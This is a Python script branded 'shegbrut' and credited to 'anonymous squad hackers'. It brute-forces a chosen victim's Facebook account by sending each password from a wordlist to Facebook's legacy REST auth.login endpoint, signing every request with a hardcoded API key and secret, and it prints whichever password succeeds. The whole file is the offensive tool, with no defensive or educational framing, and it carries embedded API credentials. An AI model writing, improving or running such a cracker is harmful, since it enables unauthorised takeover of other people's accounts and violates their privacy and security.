from time import sleep
import os
import sys
import urllib
import hashlib
API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

sleep(2)
print("""               _                _
/ _\ |__   ___  __ _| |__  _ __ _   _| |_
\ \| '_ \ / _ \/ _` | '_ \| '__| | | | __|
_\ \ | | |  __/ (_| | |_) | |  | |_| | |_
\__/_| |_|\___|\__, |_.__/|_|   \__,_|\__|
               |___/""")
sleep (2)
print("=======================================v3.6")
sleep(1)
print("***brute out your enemies with word list*** ")
sleep(1)
print("[+] >>>> anonymous squad hackers <<<<<\n")
sleep(1)
print("-------credits to anon divyanth-----------")
sleep (2)
print("+++++++++++++++++++++++++++++++++++++++++")
sleep(2)
userid = input("[*] Enter [Email|Phone|Username|ID]: ")
sleep(1)
try:
	passlist = input("[*] Set PATH to passlist: ")

	if os.path.exists(passlist) != False:
		print("cmon you don't know what a word list is ?? ")

		print(" [+] Account to crack : {}".format(userid))

		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))

		print(" [+] Cracking, please wait ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] Password found .. !!")
				print("\n[+] Password : {}".format(passwd.strip()))
				break
				print("\n\n[!] Done .. !!")
	else:
		print("shegbrut: error: No such file or directory")
except KeyboardInterrupt:
	print("shegbrut: error: Keyboard interrupt")
                                            
